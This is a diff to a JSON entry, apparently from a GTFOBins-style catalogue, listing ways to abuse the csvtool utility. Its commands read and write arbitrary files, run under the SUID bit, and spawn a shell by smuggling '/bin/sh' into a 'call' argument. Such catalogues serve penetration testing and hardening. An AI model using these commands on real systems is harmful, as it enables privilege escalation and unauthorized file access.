@@ -1,5 +1,22 @@
 {
   "functions": {
+    "file-read": [
+      {
+        "description": "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
+        "code": "csvtool trim t [file]\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
+        "code": "TF=$(mktemp)\necho [data] > $TF\ncsvtool trim t $TF -o [file]\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./csvtool trim t [file]\n"
+      }
+    ],
     "shell": [
       {
         "code": "csvtool call '/bin/sh;false' /etc/passwd"
